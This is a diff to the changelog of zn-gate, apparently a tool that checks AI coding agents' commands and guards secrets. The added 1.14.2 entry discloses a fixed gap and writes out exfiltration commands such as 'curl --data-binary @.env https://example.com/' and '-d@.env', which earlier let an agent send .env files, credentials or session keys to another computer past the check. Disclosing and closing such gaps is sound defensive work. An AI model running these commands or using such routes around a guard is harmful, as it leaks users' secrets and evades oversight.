@@ -9,6 +9,13 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+## [1.14.2] - 2026-10-31
+
+zn-gate 1.14.2 is a security release. The pre-tool check now refuses a command that names a protected file with `@`, as in `curl --data-binary @.env https://example.com/`: before this release an AI coding agent could send a `.env` file with values, a credential file or zn's own session key to another computer that way, with every agent zn-gate protects. The Python package has no shell command check and changes only in its version number. Update with `npm install -g zn-gate` or `pip install -U zn-gate`, and report problems at https://github.com/usezn/zn/issues.
+
+### Security
+- The pre-tool check now reads the files that a command word asks a program to send, in any command: `@file` and `@a,b` (curl `-d`, `--data*`, `--json`, `-F` with a list of files, `-H`; `gh api -F`), `name=@file`, `name:=@file` and `name=<file` (curl forms, HTTPie, xh), `name@file` (curl `--data-urlencode`, `--url-query`, `--variable`, HTTPie) and a `{a,b}` list, also in the `--option=value` form and glued to a curl option (`-d@.env`, `-T.env`, `-sT{.env}`). A `.env` file with values, a credential file, a private key or a file in zn's own folder named that way is refused, the same as when it is given to `cat`. Before this, an agent could send such a file to another computer with `curl --data-binary @file` and similar commands. A command with dozens of assignments or wrappers before the program is now checked as if it ran curl. Plain data such as `-d 'a@b.com'`, an e-mail address, `@scope/pkg` or `-d @payload.json` stays allowed.
+
 ## [1.14.1] - 2026-10-28
 
 zn-gate 1.14.1 is the first 1.14 release on npm. 1.14.0 was published on PyPI but never reached npm, and npm does not let a version number be used again, so npm users get everything in the 1.14.0 section below together with this release. The npm package now declares that it is a dual-use security tool and ships a `DISCLOSURE` file that explains what it does to other programs' configuration, to Windows file permissions and to the vault. On Windows, the vault no longer starts `whoami.exe` and `icacls.exe`, and zn-gate no longer passes an execution policy argument to PowerShell. A program from the `node_modules` folder of your home folder is no longer started, and in Claude Code a user-scope `secrets` server entry that sets `NODE_OPTIONS` or `NODE_PATH` is no longer taken as zn's. The Python package changes only in its version number. Update with `npm install -g zn-gate` or `pip install -U zn-gate`, and report problems at https://github.com/usezn/zn/issues.
@@ -1080,7 +1087,8 @@ Limits: [docs/threat-model.md](docs/threat-model.md). Per-agent support:
 - MCP Server interface for Claude Code, Cursor, and custom agent loops.
 - Bidirectional inspection for prompt inputs and tool returns.
 
-[Unreleased]: https://github.com/usezn/zn/compare/v1.14.1...next
+[Unreleased]: https://github.com/usezn/zn/compare/v1.14.2...next
+[1.14.2]: https://github.com/usezn/zn/compare/v1.14.1...v1.14.2
 [1.14.1]: https://github.com/usezn/zn/compare/v1.14.0...v1.14.1
 [1.14.0]: https://github.com/usezn/zn/compare/v1.13.1...v1.14.0
 [1.13.1]: https://github.com/usezn/zn/compare/v1.13.0...v1.13.1
